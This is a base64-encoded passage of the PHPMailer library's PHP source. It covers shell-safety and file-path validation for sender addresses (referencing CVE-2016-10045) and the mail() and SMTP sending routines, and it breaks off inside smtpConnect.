5IHVuc2FmZSBzaGVsbCBjaGFyYWN0ZXJzLgogICAgICogTm90ZSB0aGF0IGVzY2FwZXNoZWxsYXJnIGFuZCBlc2NhcGVzaGVsbGNtZCBhcmUgaW5hZGVxdWF0ZSBmb3Igb3VyIHB1cnBvc2VzLCBlc3BlY2lhbGx5IG9uIFdpbmRvd3MuCiAgICAgKgogICAgICogQHNlZSBodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlci9pc3N1ZXMvOTI0IENWRS0yMDE2LTEwMDQ1IGJ1ZyByZXBvcnQKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgVGhlIHN0cmluZyB0byBiZSB2YWxpZGF0ZWQKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBpc1NoZWxsU2FmZSgkc3RyaW5nKQogICAgewogICAgICAgIC8vSXQncyBub3QgcG9zc2libGUgdG8gdXNlIHNoZWxsIGNvbW1hbmRzIHNhZmVseSAod2hpY2ggaW5jbHVkZXMgdGhlIG1haWwoKSBmdW5jdGlvbikgd2l0aG91dCBlc2NhcGVzaGVsbGFyZywKICAgICAgICAvL2J1dCBzb21lIGhvc3RpbmcgcHJvdmlkZXJzIGRpc2FibGUgaXQsIGNyZWF0aW5nIGEgc2VjdXJpdHkgcHJvYmxlbSB0aGF0IHdlIGRvbid0IHdhbnQgdG8gaGF2ZSB0byBkZWFsIHdpdGgsCiAgICAgICAgLy9zbyB3ZSBkb24ndC4KICAgICAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnZXNjYXBlc2hlbGxhcmcnKSB8fCAhZnVuY3Rpb25fZXhpc3RzKCdlc2NhcGVzaGVsbGNtZCcpKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CgogICAgICAgIGlmICgKICAgICAgICAgICAgZXNjYXBlc2hlbGxjbWQoJHN0cmluZykgIT09ICRzdHJpbmcKICAgICAgICAgICAgfHwgIWluX2FycmF5KGVzY2FwZXNoZWxsYXJnKCRzdHJpbmcpLCBbIickc3RyaW5nJyIsICJcIiRzdHJpbmdcIiJdKQogICAgICAgICkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQoKICAgICAgICAkbGVuZ3RoID0gc3RybGVuKCRzdHJpbmcpOwoKICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCAkbGVuZ3RoOyArKyRpKSB7CiAgICAgICAgICAgICRjID0gJHN0cmluZ1skaV07CgogICAgICAgICAgICAvL0FsbCBvdGhlciBjaGFyYWN0ZXJzIGhhdmUgYSBzcGVjaWFsIG1lYW5pbmcgaW4gYXQgbGVhc3Qgb25lIGNvbW1vbiBzaGVsbCwgaW5jbHVkaW5nID0gYW5kICsuCiAgICAgICAgICAgIC8vRnVsbCBzdG9wICguKSBoYXMgYSBzcGVjaWFsIG1lYW5pbmcgaW4gY21kLmV4ZSwgYnV0IGl0cyBpbXBhY3Qgc2hvdWxkIGJlIG5lZ2xpZ2libGUgaGVyZS4KICAgICAgICAgICAgLy9Ob3RlIHRoYXQgdGhpcyBkb2VzIHBlcm1pdCBub24tTGF0aW4gYWxwaGFudW1lcmljIGNoYXJhY3RlcnMgYmFzZWQgb24gdGhlIGN1cnJlbnQgbG9jYWxlLgogICAgICAgICAgICBpZiAoIWN0eXBlX2FsbnVtKCRjKSAmJiBzdHJwb3MoJ0BfLS4nLCAkYykgPT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogQ2hlY2sgd2hldGhlciBhIGZpbGUgcGF0aCBpcyBvZiBhIHBlcm1pdHRlZCB0eXBlLgogICAgICogVXNlZCB0byByZWplY3QgVVJMcyBhbmQgcGhhciBmaWxlcyBmcm9tIGZ1bmN0aW9ucyB0aGF0IGFjY2VzcyBsb2NhbCBmaWxlIHBhdGhzLAogICAgICogc3VjaCBhcyBhZGRBdHRhY2htZW50LgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggQSByZWxhdGl2ZSBvciBhYnNvbHV0ZSBwYXRoIHRvIGEgZmlsZQogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgc3RhdGljIGZ1bmN0aW9uIGlzUGVybWl0dGVkUGF0aCgkcGF0aCkKICAgIHsKICAgICAgICAvL01hdGNoZXMgc2NoZW1lIGRlZmluaXRpb24gZnJvbSBodHRwczovL3d3dy5yZmMtZWRpdG9yLm9yZy9yZmMvcmZjMzk4NiNzZWN0aW9uLTMuMQogICAgICAgIHJldHVybiAhcHJlZ19tYXRjaCgnI15bYS16XVthLXpcZCsuLV0qOi8vI2knLCAkcGF0aCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDaGVjayB3aGV0aGVyIGEgZmlsZSBwYXRoIGlzIHNhZmUsIGFjY2Vzc2libGUsIGFuZCByZWFkYWJsZS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIEEgcmVsYXRpdmUgb3IgYWJzb2x1dGUgcGF0aCB0byBhIGZpbGUKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBmaWxlSXNBY2Nlc3NpYmxlKCRwYXRoKQogICAgewogICAgICAgIGlmICghc3RhdGljOjppc1Blcm1pdHRlZFBhdGgoJHBhdGgpKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJHJlYWRhYmxlID0gaXNfZmlsZSgkcGF0aCk7CiAgICAgICAgLy9JZiBub3QgYSBVTkMgcGF0aCAoZXhwZWN0ZWQgdG8gc3RhcnQgd2l0aCBcXCksIGNoZWNrIHJlYWQgcGVybWlzc2lvbiwgc2VlICMyMDY5CiAgICAgICAgaWYgKHN0cnBvcygkcGF0aCwgJ1xcXFwnKSAhPT0gMCkgewogICAgICAgICAgICAkcmVhZGFibGUgPSAkcmVhZGFibGUgJiYgaXNfcmVhZGFibGUoJHBhdGgpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gICRyZWFkYWJsZTsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgbWFpbCB1c2luZyB0aGUgUEhQIG1haWwoKSBmdW5jdGlvbi4KICAgICAqCiAgICAgKiBAc2VlIGh0dHBzOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Jvb2subWFpbC5waHAKICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSAgIFRoZSBtZXNzYWdlIGJvZHkKICAgICAqCiAgICAgKiBAdGhyb3dzIEV4Y2VwdGlvbgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgJGhlYWRlciA9IHN0YXRpYzo6c3RyaXBUcmFpbGluZ1dTUCgkaGVhZGVyKSAuIHN0YXRpYzo6JExFIC4gc3RhdGljOjokTEU7CgogICAgICAgICR0b0FyciA9IFtdOwogICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG9hZGRyKSB7CiAgICAgICAgICAgICR0b0FycltdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7CiAgICAgICAgfQogICAgICAgICR0byA9IHRyaW0oaW1wbG9kZSgnLCAnLCAkdG9BcnIpKTsKCiAgICAgICAgLy9JZiB0aGVyZSBhcmUgbm8gVG8tYWRkcmVzc2VzIChlLmcuIHdoZW4gc2VuZGluZyBvbmx5IHRvIEJDQy1hZGRyZXNzZXMpCiAgICAgICAgLy90aGUgZm9sbG93aW5nIHNob3VsZCBiZSBhZGRlZCB0byBnZXQgYSBjb3JyZWN0IERLSU0tc2lnbmF0dXJlLgogICAgICAgIC8vQ29tcGFyZSB3aXRoICR0aGlzLT5wcmVTZW5kKCkKICAgICAgICBpZiAoJHRvID09PSAnJykgewogICAgICAgICAgICAkdG8gPSAndW5kaXNjbG9zZWQtcmVjaXBpZW50czo7JzsKICAgICAgICB9CgogICAgICAgICRwYXJhbXMgPSBudWxsOwogICAgICAgIC8vVGhpcyBzZXRzIHRoZSBTTVRQIGVudmVsb3BlIHNlbmRlciB3aGljaCBnZXRzIHR1cm5lZCBpbnRvIGEgcmV0dXJuLXBhdGggaGVhZGVyIGJ5IHRoZSByZWNlaXZlcgogICAgICAgIC8vQSBzcGFjZSBhZnRlciBgLWZgIGlzIG9wdGlvbmFsLCBidXQgdGhlcmUgaXMgYSBsb25nIGhpc3Rvcnkgb2YgaXRzIHByZXNlbmNlCiAgICAgICAgLy9jYXVzaW5nIHByb2JsZW1zLCBzbyB3ZSBkb24ndCB1c2Ugb25lCiAgICAgICAgLy9FeGltIGRvY3M6IGh0dHBzOi8vd3d3LmV4aW0ub3JnL2V4aW0taHRtbC1jdXJyZW50L2RvYy9odG1sL3NwZWNfaHRtbC9jaC10aGVfZXhpbV9jb21tYW5kX2xpbmUuaHRtbAogICAgICAgIC8vU2VuZG1haWwgZG9jczogaHR0cHM6Ly93d3cuc2VuZG1haWwub3JnL35jYS9lbWFpbC9tYW4vc2VuZG1haWwuaHRtbAogICAgICAgIC8vRXhhbXBsZSBwcm9ibGVtOiBodHRwczovL3d3dy5kcnVwYWwub3JnL25vZGUvMTA1Nzk1NAogICAgICAgIC8vQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLgoKICAgICAgICAvL1BIUCA1LjYgd29ya2Fyb3VuZAogICAgICAgICRzZW5kbWFpbF9mcm9tX3ZhbHVlID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOwogICAgICAgIGlmIChlbXB0eSgkdGhpcy0+U2VuZGVyKSAmJiAhZW1wdHkoJHNlbmRtYWlsX2Zyb21fdmFsdWUpKSB7CiAgICAgICAgICAgIC8vUEhQIGNvbmZpZyBoYXMgYSBzZW5kZXIgYWRkcmVzcyB3ZSBjYW4gdXNlCiAgICAgICAgICAgICR0aGlzLT5TZW5kZXIgPSBpbmlfZ2V0KCdzZW5kbWFpbF9mcm9tJyk7CiAgICAgICAgfQogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgJiYgc3RhdGljOjp2YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgaWYgKHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICAgICAkcGFyYW1zID0gc3ByaW50ZignLWYlcycsICR0aGlzLT5TZW5kZXIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRvbGRfZnJvbSA9IGluaV9nZXQoJ3NlbmRtYWlsX2Zyb20nKTsKICAgICAgICAgICAgaW5pX3NldCgnc2VuZG1haWxfZnJvbScsICR0aGlzLT5TZW5kZXIpOwogICAgICAgIH0KICAgICAgICAkcmVzdWx0ID0gZmFsc2U7CiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbyAmJiBjb3VudCgkdG9BcnIpID4gMSkgewogICAgICAgICAgICBmb3JlYWNoICgkdG9BcnIgYXMgJHRvQWRkcikgewogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvQWRkciwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICAgICAgICAgICRhZGRyaW5mbyA9IHN0YXRpYzo6cGFyc2VBZGRyZXNzZXMoJHRvQWRkciwgdHJ1ZSwgJHRoaXMtPkNoYXJTZXQpOwogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCwKICAgICAgICAgICAgICAgICAgICBbWyRhZGRyaW5mb1snYWRkcmVzcyddLCAkYWRkcmluZm9bJ25hbWUnXV1dLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+YmNjLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5Gcm9tLAogICAgICAgICAgICAgICAgICAgIFtdCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOwogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCAkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSwgW10pOwogICAgICAgIH0KICAgICAgICBpZiAoaXNzZXQoJG9sZF9mcm9tKSkgewogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJG9sZF9mcm9tKTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkcmVzdWx0KSB7CiAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2luc3RhbnRpYXRlJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgYW4gaW5zdGFuY2UgdG8gdXNlIGZvciBTTVRQIG9wZXJhdGlvbnMuCiAgICAgKiBPdmVycmlkZSB0aGlzIGZ1bmN0aW9uIHRvIGxvYWQgeW91ciBvd24gU01UUCBpbXBsZW1lbnRhdGlvbiwKICAgICAqIG9yIHNldCBvbmUgd2l0aCBzZXRTTVRQSW5zdGFuY2UuCiAgICAgKgogICAgICogQHJldHVybiBTTVRQCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRTTVRQSW5zdGFuY2UoKQogICAgewogICAgICAgIGlmICghaXNfb2JqZWN0KCR0aGlzLT5zbXRwKSkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9IG5ldyBTTVRQKCk7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHRoaXMtPnNtdHA7CiAgICB9CgogICAgLyoqCiAgICAgKiBQcm92aWRlIGFuIGluc3RhbmNlIHRvIHVzZSBmb3IgU01UUCBvcGVyYXRpb25zLgogICAgICoKICAgICAqIEByZXR1cm4gU01UUAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2V0U01UUEluc3RhbmNlKFNNVFAgJHNtdHApCiAgICB7CiAgICAgICAgJHRoaXMtPnNtdHAgPSAkc210cDsKCiAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwOwogICAgfQoKICAgIC8qKgogICAgICogUHJvdmlkZSBTTVRQIFhDTElFTlQgYXR0cmlidXRlcwogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgIEF0dHJpYnV0ZSBuYW1lCiAgICAgKiBAcGFyYW0gP3N0cmluZyAkdmFsdWUgQXR0cmlidXRlIHZhbHVlCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRTTVRQWGNsaWVudEF0dHJpYnV0ZSgkbmFtZSwgJHZhbHVlKQogICAgewogICAgICAgIGlmICghaW5fYXJyYXkoJG5hbWUsIFNNVFA6OiR4Y2xpZW50X2FsbG93ZWRfYXR0cmlidXRlcykpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICBpZiAoaXNzZXQoJHRoaXMtPlNNVFBYQ2xpZW50WyRuYW1lXSkgJiYgJHZhbHVlID09PSBudWxsKSB7CiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5TTVRQWENsaWVudFskbmFtZV0pOwogICAgICAgIH0gZWxzZWlmICgkdmFsdWUgIT09IG51bGwpIHsKICAgICAgICAgICAgJHRoaXMtPlNNVFBYQ2xpZW50WyRuYW1lXSA9ICR2YWx1ZTsKICAgICAgICB9CgogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IFNNVFAgWENMSUVOVCBhdHRyaWJ1dGVzCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U01UUFhjbGllbnRBdHRyaWJ1dGVzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPlNNVFBYQ2xpZW50OwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHZpYSBTTVRQLgogICAgICogUmV0dXJucyBmYWxzZSBpZiB0aGVyZSBpcyBhIGJhZCBNQUlMIEZST00sIFJDUFQsIG9yIERBVEEgaW5wdXQuCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OnNldFNNVFBJbnN0YW5jZSgpIHRvIHVzZSBhIGRpZmZlcmVudCBjbGFzcy4KICAgICAqCiAgICAgKiBAdXNlcyBcUEhQTWFpbGVyXFBIUE1haWxlclxTTVRQCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgICBUaGUgbWVzc2FnZSBib2R5CiAgICAgKgogICAgICogQHRocm93cyBFeGNlcHRpb24KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNtdHBTZW5kKCRoZWFkZXIsICRib2R5KQogICAgewogICAgICAgICRoZWFkZXIgPSBzdGF0aWM6OnN0cmlwVHJhaWxpbmdXU1AoJGhlYWRlcikgLiBzdGF0aWM6OiRMRSAuIHN0YXRpYzo6JExFOwogICAgICAgICRiYWRfcmNwdCA9IFtdOwogICAgICAgIGlmICghJHRoaXMtPnNtdHBDb25uZWN0KCR0aGlzLT5TTVRQT3B0aW9ucykpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc210cF9jb25uZWN0X2ZhaWxlZCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgLy9JZiB3ZSBoYXZlIHJlY2lwaWVudCBhZGRyZXNzZXMgdGhhdCBuZWVkIFVuaWNvZGUgc3VwcG9ydCwKICAgICAgICAvL2J1dCB0aGUgc2VydmVyIGRvZXNuJ3Qgc3VwcG9ydCBpdCwgc3RvcCBoZXJlCiAgICAgICAgaWYgKCR0aGlzLT5Vc2VTTVRQVVRGOCAmJiAhJHRoaXMtPnNtdHAtPmdldFNlcnZlckV4dCgnU01UUFVURjgnKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdub19zbXRwdXRmOCcpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CiAgICAgICAgLy9TZW5kZXIgYWxyZWFkeSB2YWxpZGF0ZWQgaW4gcHJlU2VuZCgpCiAgICAgICAgaWYgKCcnID09PSAkdGhpcy0+U2VuZGVyKSB7CiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+RnJvbTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc210cF9mcm9tID0gJHRoaXMtPlNlbmRlcjsKICAgICAgICB9CiAgICAgICAgaWYgKGNvdW50KCR0aGlzLT5TTVRQWENsaWVudCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnhjbGllbnQoJHRoaXMtPlNNVFBYQ2xpZW50KTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+bWFpbCgkc210cF9mcm9tKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2Zyb21fZmFpbGVkJykgLiAkc210cF9mcm9tIC4gJyA6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNtdHAtPmdldEVycm9yKCkpKTsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+RXJyb3JJbmZvLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CgogICAgICAgICRjYWxsYmFja3MgPSBbXTsKICAgICAgICAvL0F0dGVtcHQgdG8gc2VuZCB0byBhbGwgcmVjaXBpZW50cwogICAgICAgIGZvcmVhY2ggKFskdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjY10gYXMgJHRvZ3JvdXApIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRvZ3JvdXAgYXMgJHRvKSB7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5yZWNpcGllbnQoJHRvWzBdLCAkdGhpcy0+ZHNuKSkgewogICAgICAgICAgICAgICAgICAgICRlcnJvciA9ICR0aGlzLT5zbXRwLT5nZXRFcnJvcigpOwogICAgICAgICAgICAgICAgICAgICRiYWRfcmNwdFtdID0gWyd0bycgPT4gJHRvWzBdLCAnZXJyb3InID0+ICRlcnJvclsnZGV0YWlsJ11dOwogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGlzU2VudCA9IHRydWU7CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGNhbGxiYWNrc1tdID0gWydpc3NlbnQnID0+ICRpc1NlbnQsICd0bycgPT4gJHRvWzBdLCAnbmFtZScgPT4gJHRvWzFdXTsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgLy9Pbmx5IHNlbmQgdGhlIERBVEEgY29tbWFuZCBpZiB3ZSBoYXZlIHZpYWJsZSByZWNpcGllbnRzCiAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+YWxsX3JlY2lwaWVudHMpID4gY291bnQoJGJhZF9yY3B0KSkgJiYgISR0aGlzLT5zbXRwLT5kYXRhKCRoZWFkZXIgLiAkYm9keSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZGF0YV9ub3RfYWNjZXB0ZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQoKICAgICAgICAkc210cF90cmFuc2FjdGlvbl9pZCA9ICR0aGlzLT5zbXRwLT5nZXRMYXN0VHJhbnNhY3Rpb25JRCgpOwoKICAgICAgICBpZiAoJHRoaXMtPlNNVFBLZWVwQWxpdmUpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnJlc2V0KCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPnF1aXQoKTsKICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgfQoKICAgICAgICBmb3JlYWNoICgkY2FsbGJhY2tzIGFzICRjYikgewogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygKICAgICAgICAgICAgICAgICRjYlsnaXNzZW50J10sCiAgICAgICAgICAgICAgICBbWyRjYlsndG8nXSwgJGNiWyduYW1lJ11dXSwKICAgICAgICAgICAgICAgIFtdLAogICAgICAgICAgICAgICAgW10sCiAgICAgICAgICAgICAgICAkdGhpcy0+U3ViamVjdCwKICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgJHRoaXMtPkZyb20sCiAgICAgICAgICAgICAgICBbJ3NtdHBfdHJhbnNhY3Rpb25faWQnID0+ICRzbXRwX3RyYW5zYWN0aW9uX2lkXQogICAgICAgICAgICApOwogICAgICAgIH0KCiAgICAgICAgLy9DcmVhdGUgZXJyb3IgbWVzc2FnZSBmb3IgYW55IGJhZCBhZGRyZXNzZXMKICAgICAgICBpZiAoY291bnQoJGJhZF9yY3B0KSA+IDApIHsKICAgICAgICAgICAgJGVycnN0ciA9ICcnOwogICAgICAgICAgICBmb3JlYWNoICgkYmFkX3JjcHQgYXMgJGJhZCkgewogICAgICAgICAgICAgICAgJGVycnN0ciAuPSAkYmFkWyd0byddIC4gJzogJyAuICRiYWRbJ2Vycm9yJ107CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigkdGhpcy0+bGFuZygncmVjaXBpZW50c19mYWlsZWQnKSAuICRlcnJzdHIsIHNlbGY6OlNUT1BfQ09OVElOVUUpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBJbml0aWF0ZSBhIGNvbm5lY3Rpb24gdG8gYW4gU01UUCBzZXJ2ZXIuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBvcGVyYXRpb24gZmFpbGVkLgogICAgICoKICAgICAqIEBwYXJhbSBhcnJheSAkb3B0aW9ucyBBbiBhcnJheSBvZiBvcHRpb25zIGNvbXBhdGlibGUgd2l0aCBzdHJlYW1fY29udGV4dF9jcmVhdGUoKQogICAgICoKICAgICAqIEB0aHJvd3MgRXhjZXB0aW9uCiAgICAgKgogICAgICogQHVzZXMgXFBIUE1haWxlclxQSFBNYWlsZXJcU01UUAogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENvbm5lY3QoJG9wdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIGlmIChudWxsID09PSAkdGhpcy0+c210cCkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9ICR0aGlzLT5nZXRTTVRQSW5zdGFuY2UoKTsKICAgICAgICB9CgogICAgICAgIC8vSWYgbm8gb3B0aW9ucyBhcmUgcHJvdmlkZWQsIHVzZSB3aGF0ZXZlciBpcyBzZXQgaW4gdGhlIGluc3RhbmNlCiAgICAgICAgaWYgKG51bGwgPT09ICRvcHRpb25zKSB7CiAgICAgICAgICAgICRvcHRpb25zID0gJHRoaXMtPlNNVFBPcHRpb25zOwogICAgICAgIH0KCiAgICAgICAgLy9BbHJlYWR5IGNvbm5lY3RlZD8KICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3RlZCgpKSB7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0KCiAgICAgICAgJHRoaXMtPnNtdHAtPnNldFRpbWVvdXQoJHRoaXMtPlRpbWVvdXQpOwogICAgICAgICR0aGlzLT5zbXRwLT5zZXREZWJ1Z0xldmVsKCR0aGlzLT5TTVRQRGVidWcpOwogICAgICAgICR0aGlzLT5zbXRwLT5zZXREZWJ1Z091dHB1dCgkdGhpcy0+RGVidWdvdXRwdXQpOwogICAgICAgICR0aGlzLT5zbXRwLT5zZXRWZXJwKCR0aGlzLT5kb192ZXJwKTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0U01UUFVURjgoJHRoaXMtPlVzZVNNVFBVVEY4KTsKICAgICAgICBpZiAoJHRoaXMtPkhvc3QgPT09IG51bGwpIHsKICAgICAgICAgICAgJHRoaXMtPkhvc3QgPSAnbG9jYWxob3N0JzsKICAgICAgICB9CiAgICAgICAgJGhvc3RzID0gZXhwbG9kZSgnOycsICR0aGlzLT5Ib3N0KTsKICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9IG51bGw7CgogICAgICAgIGZvcmVhY2ggKCRob3N0cyBhcyAkaG9zdGVudHJ5KSB7CiAgICAgICAgICAgICRob3N0aW5mbyA9IFtdOwogICAgICAgICAgICBpZiAoCiAgICAgICAgICAgICAgICAhcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICAgICAnL14oPzooc3NsfHRscyk6XC9cLyk/KC4rPykoPzo6KFxkKykpPyQvJywKICAgICAgICAgICAgICAgICAgICB0cmltKCRob3N0ZW50cnkpLAogICAgICAgICAgICAgICAgICAgICRob3N0aW5mbwogICAgICAgICAgICAgICAgKQogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJHRoaXMtPmxhbmcoJ2ludmFsaWRfaG9zdGVudHJ5JykgLiAnICcgLiB0cmltKCRob3N0ZW50cnkpKTsKICAgICAgICAgICAgICAgIC8vTm90IGEgdmFsaWQgaG9zdCBlbnRyeQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgLy8kaG9zdGluZm9bMV06IG9wdGlvbmFsIHNzbCBvciB0bHMgcHJlZml4CiAgICAgICAgICAgIC8vJGhvc3RpbmZvWzJdOiB0aGUgaG9zdG5hbWUKICAgICAgICAgICAgLy8kaG9zdGluZm9bM106IG9wdGlvbmFsIHBvcnQgbnVtYmVyCiAgICAgICAgICAgIC8vVGhlIGhvc3Qgc3RyaW5nIHByZWZpeCBjYW4gdGVtcG9yYXJpbHkgb3ZlcnJpZGUgdGhlIGN1cnJlbnQgc2V0dGluZyBmb3IgU01UUFNlY3VyZQogICAg